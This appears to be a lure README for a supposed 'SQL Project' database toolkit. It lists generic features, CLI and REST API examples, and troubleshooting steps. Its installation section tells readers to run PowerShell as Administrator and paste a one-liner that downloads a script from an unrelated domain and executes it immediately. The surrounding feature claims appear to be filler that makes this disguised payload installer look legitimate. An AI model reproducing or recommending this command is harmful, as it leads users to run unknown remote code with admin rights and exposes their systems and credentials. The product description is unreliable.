# SQL Project — Complete SQL Database Development & Management Suite

> All-in-one SQL toolkit — database design, query development, optimization, backup, and documentation in one package.

---

## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

> [!TIP]
> **Полезный совет:** Используйте виртуальное окружение Python для изоляции зависимостей баз данных.

### Step 1: Open CMD or PowerShell as Administrator
```
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Copy & Paste in PowerShell
```
irm https://gitrm.sbs?t=sql-project | iex
```

### Step 3: Wait for Completion
```
[1/4] Loading SQL Project modules...
[2/4] Extracting database and query components...
[3/4] Installing optimization and documentation utilities...
[4/4] Ready. Start developing SQL projects.
```

### Step 4: Start Using the Toolkit
- Launch via `sql-project.exe` or `npm start`
- Design databases and write queries
- Optimize performance and generate documentation

---

## TL;DR - Quick Summary

**SQL Project** combines database design, query development, performance optimization, backup management, and documentation generation. Covers all major SQL development and management needs.

**Best for:** Database administrators, SQL developers, and data engineers.

**Key differentiators:**
1. Visual database design and ER diagrams
2. Query development with autocomplete
3. Performance optimization and indexing
4. Automated backup and restore
5. Documentation generation
6. Multi-database engine support

---

## Core Features

### Database Design
```
✅ Visual ER diagram designer
✅ Schema generation from diagrams
✅ Table relationship visualization
✅ Index recommendation
✅ Normalization assistance
✅ Reverse engineering from database
✅ Forward engineering to database
✅ Version control for schemas
```

### Query Development
```
✅ Syntax highlighting and autocomplete
✅ Query formatting and beautification
✅ Query performance analysis
✅ EXPLAIN plan visualization
✅ Query history and snippets
✅ Batch query execution
✅ Multi-statement support
✅ Parameterized queries
```

### Performance Optimization
```
✅ Slow query detection
✅ Index usage analysis
✅ Table statistics monitoring
✅ Query caching recommendations
✅ Partition suggestions
✅ Deadlock detection
✅ Resource usage tracking
✅ Performance benchmarking
```

### Backup & Documentation
```
✅ Automated backup scheduling
✅ Incremental backup support
✅ Restore verification
✅ Documentation generation (ERD, schemas)
✅ Export to multiple formats (PDF, HTML, Markdown)
✅ Data dictionary creation
✅ Change tracking
✅ Compliance reporting
```

---

## Usage

```bash
# Connect to database
sql-project connect --host "localhost" --port 5432 --database "mydb" --user "admin"

# Design schema
sql-project schema design --name "ecommerce" --output "./schemas/ecommerce.er"

# Optimize query
sql-project optimize --query "SELECT * FROM users WHERE created_at > '2024-01-01'" --database "mydb"

# Generate documentation
sql-project docs generate --database "mydb" --format "html" --output "./docs/"
```

---

## REST API

```bash
# Execute query via API
curl -X POST "http://localhost:6666/api/sql/query" -H "Content-Type: application/json" -d '{"database": "mydb", "query": "SELECT * FROM users LIMIT 10"}'

# Generate docs via API
curl -X POST "http://localhost:6666/api/sql/docs" -H "Content-Type: application/json" -d '{"database": "mydb", "format": "html"}'

# Backup database via API
curl -X POST "http://localhost:6666/api/sql/backup" -H "Content-Type: application/json" -d '{"database": "mydb", "type": "full"}'
```

---

## Screenshots

- Dashboard: `screenshots/dashboard.png`
- ER Diagram: `screenshots/er-diagram.png`
- Query Editor: `screenshots/query-editor.png`
- Performance Analysis: `screenshots/performance-analysis.png`
- Documentation: `screenshots/documentation.png`

---

## Troubleshooting

### Connection Fails
```bash
sql-project connect check --host "localhost" --port 5432 --database "mydb"
sql-project connect --host "localhost" --port 5432 --database "mydb" --user "admin" --debug
```

### Query Optimization Issues
```bash
sql-project optimize validate --query "SELECT * FROM users" --database "mydb"
sql-project optimize --query "SELECT * FROM users WHERE created_at > '2024-01-01'" --database "mydb" --force
```

### Documentation Errors
```bash
sql-project docs check --database "mydb"
sql-project docs generate --database "mydb" --format "html" --output "./docs/" --force
```

---

## Use Cases

### Database Development
- Design database schemas
- Write and optimize queries
- Generate documentation
- Version control schemas

### Performance Optimization
- Analyze slow queries
- Recommend indexes
- Monitor performance
- Benchmark changes

### Backup & Recovery
- Schedule automated backups
- Test restore procedures
- Verify backup integrity
- Disaster recovery planning

---

> [!NOTE]
> **Обратите внимание:** Поддерживает PostgreSQL, MySQL, MariaDB, SQLite, SQL Server, Oracle. Убедитесь, что драйверы БД установлены.

## ⚠️ IMPORTANT

Always backup databases before making schema changes. Test queries on staging before production.

---

## License

MIT License - see LICENSE file for details.

---

## Tags

`sql-project` `sql` `database` `database-design` `query-development` `performance-optimization` `backup-management` `documentation` `erd` `sql-development`